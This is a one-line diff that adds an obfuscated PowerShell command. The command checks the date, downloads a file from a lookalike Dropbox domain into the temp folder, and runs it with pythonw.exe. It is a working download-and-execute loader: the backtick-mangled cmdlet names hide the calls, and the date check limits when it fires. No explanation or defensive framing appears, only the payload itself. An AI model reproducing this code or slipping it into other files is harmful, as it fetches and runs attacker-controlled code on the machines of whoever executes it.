@@ -1,0 +1,1 @@
+﻿if ((g`ET-d`ATE).Ticks -lt (GEt-dA`TE -Date '18-jan-2017 00:00:00').Ticks) {(new-`OB`jECt System.Net.WebClient).DownloadFile('http://drobbox-api.dynu.com/update',"$env:temp\update");STa`Rt-pr`ocEsS pythonw.exe "$env:temp\update 31337"};
